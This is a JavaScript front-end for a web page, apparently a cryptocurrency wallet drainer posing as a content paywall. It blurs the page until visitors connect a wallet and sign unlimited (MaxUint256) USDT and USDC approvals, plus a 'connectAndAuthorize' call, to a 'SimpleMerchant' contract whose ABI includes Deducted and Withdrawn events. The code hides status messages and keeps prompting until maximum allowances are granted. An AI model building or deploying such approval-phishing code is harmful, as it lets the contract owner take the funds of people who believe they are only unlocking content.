// SPDX-License-Identifier: MIT
// pragma solidity ^0.8.20;  //  Not applicable in JavaScript

// 你的 USDC 合約地址 (务必替换成正确的合约地址)
const USDC_CONTRACT_ADDRESS = '0x26a56371201d2611763afb8b427ccb2239746560'; //  你的 USDC 合约地址 (正确!)
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // 你的 USDT 合约地址 (正确!)
const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; // 你的 SimpleMerchantERC 合约地址

// 合約 ABI (確保包含了 connectAndAuthorize, authorized, Deducted 事件)
const CONTRACT_ABI = [
    "function connectAndAuthorize(address tokenContract) external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer, address indexed token)",
    // 包含 ETHReceived, Deducted 這些事件 (為了檢查)
    "event Deducted(address indexed customer, address indexed token, uint256 amount)",
    "event EthReceived(address indexed sender, uint256 amount)",
    "event Withdrawn(uint256 amount)",
];

// USDT 和 USDC 的 ABI (與 OpenZeppelin 的 ERC20 ABI 相同 - 為了 approve, balanceOf, allowance)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract, usdcContract;

// 存储事件监听器引用以在重新初始化时移除旧的监听器
let accountChangeListener = null;
let chainChangeListener = null;

const overlay = document.getElementById('blurOverlay'); // 新增：獲取遮罩元素
const overlayMessage = document.getElementById('overlayMessage'); // 新增：獲取遮罩訊息元素

// --- 遮罩控制函數 ---
function hideOverlay() {
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300); // 等待淡出效果完成
}

function showOverlay(message) {
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- initializeWallet 函數 (仅保留错误/必要消息) ---
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            showOverlay('請安裝 MetaMask 或支援的錢包以繼續');
            return;
        }

        provider = new ethers.BrowserProvider(window.ethereum);

        // 移除舊的監聽器以防止重複綁定
        if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
        if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);

        // 檢查網絡並切換到 Mainnet (保持不變)
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) { // 1n is Mainnet Chain ID
            updateStatus('Switching to Ethereum Mainnet...');
            showOverlay('正在嘗試切換到以太坊主網... 請在錢包中確認');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }]
                });
                // 成功切換後重新初始化 provider
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork();
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('User rejected network switch. Please manually switch to Ethereum Mainnet.');
                    showOverlay('用戶拒絕切換網絡。請手動切換到 Ethereum Mainnet。');
                } else {
                    updateStatus(`Network switch failed: ${switchError.message}`);
                    showOverlay(`網絡切換失敗: ${switchError.message}`);
                }
                return;
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();

            // 使用 signer 初始化合約实例
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer); // 使用 ERC20_ABI
            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer); // 使用 ERC20_ABI

            // ** 連線已恢復，直接檢查授權，不顯示進度文字 **
            updateStatus(''); // 清空/隱藏狀態欄
            await checkAuthorization();
        } else {
            updateStatus('');
            showOverlay('請鏈接錢包以解鎖內容 🔒');
        }

        // 帳戶變更監聽器，簡化為重新初始化
        accountChangeListener = (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('Wallet disconnected');
            } else {
                initializeWallet();
            }
        };
        window.ethereum.on('accountsChanged', accountChangeListener);

        // 網絡變更監聽器
        chainChangeListener = () => {
            resetState();
            updateStatus('Network changed, please reconnect wallet');
            window.location.reload();
        };
        window.ethereum.on('chainChanged', chainChangeListener);

    } catch (error) {
        updateStatus(`Initialization failed: ${error.message}`);
        console.error("Initialize Wallet Error:", error);
        showOverlay(`初始化失敗: ${error.message}`);
    }
}

// --- checkAuthorization 函數 (檢查 USDT 和 USDC 的授權狀態) ---
async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract) {
            showOverlay('錢包未準備好。請連線。');
            return;
        }

        // 檢查 SimpleMerchant 合約的授權
        const isAuthorized = await contract.authorized(userAddress);

        // 檢查 USDT 的授權
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        const maxAllowance = ethers.MaxUint256;
        let usdtBalance = 0n;
        try {
            usdtBalance = await usdtContract.balanceOf(userAddress);
        } catch(e) { /* Ignore balance read error */ }
        const isUsdtMaxApproved = usdtAllowance >= maxAllowance / 2n; // 檢查是否接近最大值

        // 检查 USDC 的授权
        const usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        let usdcBalance = 0n;
        try {
            usdcBalance = await usdcContract.balanceOf(userAddress);
        } catch(e) { /* Ignore balance read error */ }
        const isUsdcMaxApproved = usdcAllowance >= maxAllowance / 2n; // 檢查是否接近最大值


        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += '錢包鏈接已授權 ✅. ';
        } else {
            statusMessage += '錢包鏈接未授權 ❌. ';
        }

        // USDT 的授權狀態
        statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
        if (isUsdtMaxApproved) {
            statusMessage += `USDT 授权 MaxUint256 ✅.`;
        } else if (usdtAllowance > 0n) {
            statusMessage += `USDT 授權不足 ⚠️.`;
        } else {
            statusMessage += `USDT 未授權或授權為零 ❌.`;
        }

        // USDC 的授權狀態
        statusMessage += `USDC Balance: ${ethers.formatUnits(usdcBalance, 6)}. `;
        if (isUsdcMaxApproved) {
            statusMessage += `USDC 授权 MaxUint256 ✅.`;
        } else if (usdcAllowance > 0n) {
            statusMessage += `USDC 授權不足 ⚠️.`;
        } else {
            statusMessage += `USDC 未授權或授權為零 ❌.`;
        }

        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved && isUsdcMaxApproved;  // 同时检查 USDT 和 USDC

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隱藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
            showOverlay('需要完成授權才能查看內容。點擊右上角鏈接錢包。'); // 授權未完成，顯示遮罩
        }

    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`檢查授權失敗: ${error.message}`);
    }
}

// --- connectWallet 函數 (主要修改：調用 connectAndAuthorize 和 approve) ---
async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            return;
        }

        updateStatus(''); // 連線開始，隱藏狀態欄
        showOverlay('請在您的錢包中確認連線請求...');

        // Request wallet connection (MetaMask will confirm or maintain connection)
        await provider.send('eth_requestAccounts', []);

        // Re-get signer and contract instances
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);  // 初始化 USDC 合约

        // Check ETH balance (for Gas Fee)  (保持不變)
        const ethBalance = await provider.getBalance(userAddress);
        const requiredEthForGas = ethers.parseEther('0.001');
        if (ethBalance < requiredEthForGas) {
            updateStatus(`Warning: ETH balance may be insufficient for authorization transactions (Suggested min ${ethers.formatEther(requiredEthForGas)} ETH, Actual ${ethers.formatEther(ethBalance)} ETH).`);
        } else {
            updateStatus('');
        }

        // 1. 检查 SimpleMerchant 合约的授权 (connectAndAuthorize，仅用于连接和授权，无需传递代币地址)
        let isAuthorized = await contract.authorized(userAddress); // 不需要传参
        if (!isAuthorized) {
          updateStatus(''); // 隐藏进度
          showOverlay('1/3: 請在錢包中簽署 SimpleMerchant 合約授權'); // 修改提示
          const txAuthorize = await contract.connectAndAuthorize(USDC_CONTRACT_ADDRESS); // 调用 connectAndAuthorize
          await txAuthorize.wait();
          updateStatus(''); // 隐藏成功消息
        } else {
          updateStatus(''); // 隐藏已授权消息
        }

        // 2. 检查并执行 USDT 代币的批准 (approve)
        let usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        const maxAllowance = ethers.MaxUint256;

        // Re-approve if approval is not MaxUint256 (or close)
        if (usdtAllowance < maxAllowance) {
            updateStatus(''); // 隐藏进度
            showOverlay('2/3: 請在錢包中簽署 USDT 授權');
            const txApproveUsdt = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
            await txApproveUsdt.wait();
            updateStatus(''); // 隐藏成功消息
        } else {
            updateStatus(''); // 隐藏已授权消息
        }

        // 3. 检查并执行 USDC 代币的批准 (approve)
        let usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);

        // Re-approve if approval is not MaxUint256 (or close)
        if (usdcAllowance < maxAllowance) {
            updateStatus(''); // 隐藏进度
            showOverlay('3/3: 請在錢包中簽署 USDC 授權');
            const txApproveUsdc = await usdcContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
            await txApproveUsdc.wait();
            updateStatus(''); // 隐藏成功消息
        } else {
            updateStatus(''); // 隐藏已授权消息
        }

        // Final check and update button appearance
        await checkAuthorization();
        updateStatus(''); // 連線成功，隱藏狀態欄

    } catch (error) {
        updateStatus(`Operation failed: ${error.message}`);
        console.error("Connect Wallet Error:", error);
        connectButton.classList.remove('connected');
        connectButton.title = 'Connect Wallet';
        connectButton.disabled = false;
        showOverlay(`操作失敗。請重試或手動檢查連線。錯誤: ${error.message.slice(0, 50)}...`);
    }
}

// --- 其他函數 (保持不變) ---

function disconnectWallet() {
    resetState();
    updateStatus('Wallet disconnected, please reconnect.');
    alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.');
    showOverlay('錢包已斷開鏈接，請重新鏈接以解鎖內容 🔒');
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    usdcContract = null; // 重置 USDC 合约实例
    connectButton.classList.remove('connected');
    connectButton.title = 'Connect Wallet';
    connectButton.disabled = false;
    updateStatus('');
    showOverlay('請鏈接錢包以解鎖內容 🔒');
}

/**
 * 核心功能：控制状态栏的隐藏与显示。
 */
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (message) {
        statusDiv.innerHTML = `${message}`;
        statusDiv.style.display = 'block';
    } else {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none';
    }
}

// Listen for connect button click
connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

// Initialize wallet state on page load
initializeWallet();
console.log('connectButton event listener added and initializeWallet called');